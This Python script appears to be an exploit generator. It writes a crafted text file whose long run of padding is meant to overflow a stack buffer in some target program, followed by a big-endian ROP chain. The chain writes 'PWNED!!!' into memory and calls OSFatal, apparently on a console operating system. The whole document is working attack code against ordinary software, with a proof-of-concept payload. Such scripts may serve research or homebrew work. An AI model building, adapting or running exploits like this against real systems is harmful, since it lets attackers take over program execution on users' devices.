import sys
import struct
sys.path.append("..")
from common.ropgadgets import *


header = '''0	0	0	0
0	0	0	0
0	0	0	0
0	0	0	0
0	0	0	0
0	0	0	0
0	0	0	0
0	0	0	0
0	0	0	0
0	0	0	0

'''
rawData = header.encode('cp1252')

# Create a long string to cause a stack overflow
rawData += b'\x20' * 0x1d7

# Add ropchain :) Make sure not to use '\0' inside the rop chain.
rop_chain = []
rop_chain += write32(0x100105ec,0x50574E45) # Write 'PWNE' to 0x0x100105ec
rop_chain += write32(0x100105f0,0x44212121) # Write 'D!!!' to 0x0x100105f0
rop_chain += OSFatal(0x100105ec)            # Call OSFatal((char*)0x100105ec)

for val in rop_chain:
    rawData += struct.pack('>I', val)

file_path = r'01.001.01.txt'

with open(file_path, 'wb') as file:
    # Write the rawData to the file
    file.write(rawData)